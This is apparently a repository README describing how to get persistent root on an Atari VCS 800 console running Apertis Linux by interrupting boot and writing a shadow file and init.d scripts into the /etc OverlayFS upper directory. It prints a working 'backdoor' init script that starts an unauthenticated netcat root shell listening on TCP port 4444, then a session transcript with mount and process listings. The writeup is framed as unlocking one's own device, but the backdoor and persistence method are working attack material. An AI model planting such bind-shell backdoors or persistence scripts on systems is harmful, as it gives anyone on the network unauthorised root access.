# AtariVCSroot

Atari VCS 800 - https://atarivcs.com/atari-vcs-800-black-walnut-all-in-bundle/

The following file systems are present on the VCS
```
/ # fdisk -l 
Disk /dev/mmcblk0: 29.2 GiB, 31306285056 bytes, 61145088 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: C30F3CC4-E0B8-480A-B0FD-406A1ABF6E85

Device           Start      End  Sectors   Size Type
/dev/mmcblk0p1    3906   500000   496095 242.2M EFI System
/dev/mmcblk0p2  500001   750000   250000 122.1M EFI System
/dev/mmcblk0p3  750001  1000000   250000 122.1M EFI System
/dev/mmcblk0p4 1000001  1500000   500000 244.1M Linux filesystem
/dev/mmcblk0p5 1500001  2000000   500000 244.1M unknown
/dev/mmcblk0p6 2000001  2500000   500000 244.1M unknown
/dev/mmcblk0p7 2500001  5250000  2750000   1.3G Linux root (x86-64)
/dev/mmcblk0p8 5250001  8000000  2750000   1.3G Linux root (x86-64)
/dev/mmcblk0p9 8000001 61145054 53145054  25.3G Linux home
```

The system runs Apertis Linux - https://www.apertis.org
```
/ # cat /etc/issue	
Apertis v2020 \n \l
```

Multiple partitions are for use by the running Apertis instance.<br>
/dev/mmcblk0p4 is the /var partition for Apertis<br>
/dev/mmcblk0p7 is the main linux OS<br>
/dev/mmcblk0p8 is the backup linux OS<br>
/dev/mmcblk0p9 is the /home partition for Apertis<br>

When the VCS boots rapidly pressing <ctrl+c> will interrupt the systemd startup scripts. Eventually you will be left with a black screen. Pressing <alt+f1> through <alt+f6> will allow access to tty's that can be used for login.<br>

The exploit in this repo takes advantage of the OverlayFS used by the system.<br>
```
/ # mount|grep overlay
overlay on /etc type overlay (rw,relatime,lowerdir=/root/etc,upperdir=/root/var/lib/overlays/etc/upper,workdir=/root/var/lib/overlays/etc/work)
```

Merging in malicious files into /etc allows for easy persistent root access. In this case we add a shadow file, and a few init.d scripts to trigger via rc.d runlevels 3-4. 
```
/ # ls /var/lib/overlays/etc/upper 
NetworkManager
init.d
localtime
machine-id
mtab
rc3.d
rc4.d
rc5.d
resolv.conf
shadow
timezone
```

A simple backdoor allows for convienent access on demand via tty, or tcp port. 
```
/ # cat /var/lib/overlays/etc/upper/init.d/backdoor
#! /bin/sh
. /lib/lsb/init-functions

set -e

case "$1" in
  start)
        busybox nc -ll -p 4444 -e /bin/sh &
        ;;
  stop|reload|restart|force-reload|status)
        ;;
  *)
        echo "Usage: backdoor {start|stop|restart|force-reload|status}" >&2
        exit 1
        ;;
esac

exit 0
```

Once you've gained root access via this repo you should see the following result:
```
$ nc -vvv 192.168.1.28 4444
Connection to 192.168.1.28 port 4444 [tcp/krb524] succeeded!
ash -i

BusyBox v1.30.1 (Apertis 1:1.30.1-4co1bv2020preb1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/ # id
uid=0(root) gid=0(root)
/ # uname -a
Linux atari-vcs 5.4.0-3-amd64 #1 SMP Debian 5.4.13-2ata12~~+104+g85b9705cd (2020-07-28) x86_64 GNU/Linux
/ # mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=2989708k,nr_inodes=747427,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=602640k,mode=755)
/dev/mapper/root on / type ext4 (ro,noatime,errors=remount-ro)
/dev/mmcblk0p4 on /var type ext4 (rw,relatime)
overlay on /etc type overlay (rw,relatime,lowerdir=/root/etc,upperdir=/root/var/lib/overlays/etc/upper,workdir=/root/var/lib/overlays/etc/work)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
efivarfs on /sys/firmware/efi/efivars type efivarfs (rw,nosuid,nodev,noexec,relatime)
none on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=40,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=5282)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
tmpfs on /media type tmpfs (rw,relatime,mode=755)
mqueue on /dev/mqueue type mqueue (rw,relatime)
/dev/mmcblk0p2 on /boot/efi type vfat (rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro)
tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev)
/dev/mmcblk0p9 on /home type ext4 (rw,relatime,x-systemd.growfs)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=602640k,mode=700,uid=1000,gid=1000)
/dev/sda3 on /media/user/writable type ext4 (rw,nosuid,nodev,relatime,sync,uhelper=udisks2)
/ # busybox ps
PID   USER     COMMAND
    1 root     {systemd} /sbin/init splash
    2 root     [kthreadd]
    3 root     [rcu_gp]
    4 root     [rcu_par_gp]
    5 root     [kworker/0:0-eve]
    6 root     [kworker/0:0H]
    7 root     [kworker/0:1-eve]
    8 root     [kworker/u16:0-e]
    9 root     [mm_percpu_wq]
   10 root     [ksoftirqd/0]
   11 root     [rcu_sched]
   12 root     [migration/0]
   13 root     [cpuhp/0]
   14 root     [cpuhp/1]
   15 root     [migration/1]
   16 root     [ksoftirqd/1]
   17 root     [kworker/1:0-eve]
   18 root     [kworker/1:0H-kb]
   19 root     [cpuhp/2]
   20 root     [migration/2]
   21 root     [ksoftirqd/2]
   22 root     [kworker/2:0-eve]
   23 root     [kworker/2:0H-kb]
   24 root     [cpuhp/3]
   25 root     [migration/3]
   26 root     [ksoftirqd/3]
   27 root     [kworker/3:0-eve]
   28 root     [kworker/3:0H-kb]
   29 root     [kdevtmpfs]
   30 root     [netns]
   31 root     [kauditd]
   32 root     [khungtaskd]
   33 root     [oom_reaper]
   34 root     [writeback]
   35 root     [kcompactd0]
   36 root     [ksmd]
   37 root     [khugepaged]
   39 root     [kworker/2:1-eve]
   40 root     [kworker/u16:1-k]
   82 root     [kintegrityd]
   83 root     [kblockd]
   84 root     [blkcg_punt_bio]
   85 root     [edac-poller]
   86 root     [devfreq_wq]
   87 root     [kswapd0]
   88 root     [kthrotld]
   89 root     [irq/25-aerdrv]
   90 root     [irq/26-aerdrv]
   91 root     [irq/28-aerdrv]
   92 root     [kworker/1:1-eve]
   93 root     [kworker/3:1-eve]
   94 root     [acpi_thermal_pm]
   95 root     [ipv6_addrconf]
  106 root     [kstrp]
  110 root     [kworker/u17:0-h]
  143 root     [kworker/0:2-eve]
  154 root     [sdhci]
  155 root     [irq/7-mmc0]
  156 root     [kworker/3:2-eve]
  159 root     [kworker/u16:2-k]
  160 root     [ata_sff]
  163 root     [scsi_eh_0]
  164 root     [scsi_tmf_0]
  165 root     [mmc_complete]
  166 root     [kworker/2:1H-kb]
  167 root     [kworker/3:1H-kb]
  168 root     [kworker/1:1H-ev]
  169 root     [kworker/1:2-pm]
  170 root     [kworker/3:2H-kb]
  171 root     [kworker/0:1H-kb]
  172 root     [kworker/2:2H-mm]
  173 root     [kworker/2:3H-mm]
  174 root     [ttm_swap]
  175 root     [gfx]
  176 root     [comp_1.0.0]
  177 root     [comp_1.1.0]
  178 root     [comp_1.2.0]
  179 root     [comp_1.3.0]
  180 root     [comp_1.0.1]
  181 root     [comp_1.1.1]
  182 root     [comp_1.2.1]
  183 root     [comp_1.3.1]
  184 root     [sdma0]
  185 root     [vcn_dec]
  186 root     [vcn_enc0]
  187 root     [vcn_enc1]
  188 root     [vcn_jpeg]
  189 root     [kworker/1:3-eve]
  196 root     [scsi_eh_1]
  197 root     [scsi_tmf_1]
  198 root     [usb-storage]
  203 root     [kdmflush]
  205 root     [kworker/2:2-eve]
  206 root     [dm_bufio_cache]
  207 root     [kverityd]
  209 root     [kworker/0:2H-kb]
  222 root     [kworker/u16:3-k]
  223 root     [kworker/u16:4-k]
  224 root     [jbd2/dm-0-8]
  225 root     [ext4-rsv-conver]
  231 root     [jbd2/mmcblk0p4-]
  232 root     [ext4-rsv-conver]
  264 root     [kworker/1:2H-kb]
  266 root     /lib/systemd/systemd-journald
  278 root     /lib/systemd/systemd-udevd
  279 root     [kworker/2:3-eve]
  325 root     [watchdogd]
  326 root     [tpm_dev_wq]
  327 root     [kworker/u16:5-f]
  335 root     [cryptd]
  346 root     [cfg80211]
  389 root     [kworker/u16:6-k]
  437 root     [kworker/u16:7-c]
  441 root     [kworker/2:4H]
  447 root     [kworker/3:3H-kb]
  455 root     [kworker/3:3-eve]
  457 root     [kworker/0:3-mem]
  458 root     [kworker/0:4-eve]
  464 root     [irq/45-rtwpci]
  467 root     [kworker/u17:1-h]
  468 root     [kworker/u17:2-h]
  469 root     [kworker/3:4H]
  478 root     [kworker/1:3H]
  480 root     [jbd2/mmcblk0p9-]
  481 root     [ext4-rsv-conver]
  489 systemd- /lib/systemd/systemd-timesyncd
  609 messageb /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  611 root     /lib/systemd/systemd-logind
  612 root     /usr/lib/bluetooth/bluetoothd
  613 root     /usr/sbin/NetworkManager --no-daemon
  614 root     /usr/lib/udisks2/udisksd
  616 root     /usr/bin/companion-app-daemon
  617 root     /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
  626 root     busybox nc -ll -p 4444 -e /bin/sh
  629 polkitd  /usr/lib/polkit-1/polkitd --no-debug
  649 user     /usr/bin/systemctl --wait --user start atari-session.target
  656 user     /lib/systemd/systemd --user
  657 user     (sd-pam)
  666 user     (sd-pam)
  667 user     /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  668 user     /usr/bin/weston -i 0 --xwayland --modules systemd-notify.so
  678 user     /usr/lib/x86_64-linux-gnu/weston-keyboard
  679 user     /usr/local/dashboard/Dashboard
  683 root     /usr/bin/rauc --mount=/run/rauc service
  691 user     /usr/lib/x86_64-linux-gnu/weston-desktop-shell
  695 user     /usr/bin/Xwayland :0 -rootless -listen 59 -listen 60 -wm 61 -terminate
  746 user     /usr/bin/pulseaudio --daemonize=no
  750 root     [krfcommd]
  756 user     /usr/lib/x86_64-linux-gnu/system-bridge-daemon
  763 root     /usr/libexec/fwupd/fwupd
  775 root     /usr/lib/upower/upowerd
  798 root     /usr/lib/x86_64-linux-gnu/bundle-handler
  830 root     [jbd2/sda3-8]
  831 root     [ext4-rsv-conver]
  851 root     [kworker/2:4-eve]
  852 root     [kworker/2:5-eve]
  861 root     [kworker/3:4-eve]
  867 root     /bin/sh
  868 root     ash -i
  872 root     busybox ps
```
